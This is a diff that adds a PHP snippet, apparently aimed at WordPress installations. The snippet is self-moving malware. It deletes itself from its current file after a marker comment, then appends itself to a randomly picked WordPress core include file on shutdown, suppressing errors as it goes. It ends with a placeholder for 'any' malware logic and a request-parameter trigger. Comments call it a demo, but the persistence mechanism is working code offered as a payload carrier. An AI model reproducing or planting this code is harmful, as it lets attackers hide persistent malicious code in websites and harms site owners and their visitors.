@@ -1,0 +1,54 @@
+//marker_weaver_ftw
+$target_files = array(
+    ABSPATH . WPINC . '/class-wp-paused-extensions-storage.php',
+    ABSPATH . WPINC . '/class-wp-fatal-error-handler.php',
+    ABSPATH . WPINC . '/class-wp-recovery-mode-cookie-service.php',
+    ABSPATH . WPINC . '/class-wp-recovery-mode-key-service.php',
+    ABSPATH . WPINC . '/class-wp-recovery-mode-link-service.php',
+    ABSPATH . WPINC . '/class-wp-recovery-mode-email-service.php',
+    ABSPATH . WPINC . '/class-wp-recovery-mode.php',
+    ABSPATH . WPINC . '/error-protection.php',
+    ABSPATH . WPINC . '/default-constants.php',
+    ABSPATH . WPINC . '/plugin.php',
+    ABSPATH . WPINC . '/compat.php',
+    ABSPATH . WPINC . '/class-wp-list-util.php',
+    ABSPATH . WPINC . '/formatting.php',
+    ABSPATH . WPINC . '/meta.php',
+    ABSPATH . WPINC . '/functions.php',
+    ABSPATH . WPINC . '/class-wp-meta-query.php',
+    ABSPATH . WPINC . '/class-wp-matchesmapregex.php',
+    ABSPATH . WPINC . '/class-wp.php',
+    ABSPATH . WPINC . '/class-wp-error.php',
+    ABSPATH . WPINC . '/pomo/mo.php',
+    ABSPATH . WPINC . '/l10n.php'
+    //just for demo purposes, that is why too few :)
+);
+
+//must be here because collisions of the rand and race conditions
+if ( ! function_exists("weaver_plant_payload") ){
+    function weaver_plant_payload($file, $payload_data, $append){
+        //grab the session for one peer only - payload almost forever in memory
+        if ( isset($_REQUEST["peer"]) && $_REQUEST["peer"]!="" ) sleep(9);
+        if ( $append ){
+            @file_put_contents($file, $payload_data, FILE_APPEND | LOCK_EX);
+        }else{
+            @file_put_contents($file, $payload_data, LOCK_EX);
+        }
+        //time window to switch "session" towards another peer
+        if ( isset($_REQUEST["peer"]) && $_REQUEST["peer"]!="" ) sleep(2);
+    }
+    $the_file = $target_files[rand(0,(sizeof($target_files)-1))];
+    $my_content = @file_get_contents(__FILE__);
+    $my_content_list = @explode("//\x6Darker_weaver_ftw", $my_content);
+    if ( is_array($my_content_list) && sizeof($my_content_list) >= 2 ){
+        @file_put_contents(__FILE__, $my_content_list[0]);
+        @register_shutdown_function("weaver_plant_payload", $the_file, "//\x6Darker_weaver_ftw".$my_content_list[1], true);
+    }else{
+        //shouldn't be here, but at least don't damage the instance
+        @register_shutdown_function("weaver_plant_payload", __FILE__, $my_content, false);
+    }
+}
+//malware code below - any length, any logic
+if ( isset($_REQUEST["wppply"])){
+    exit("deeply");
+}
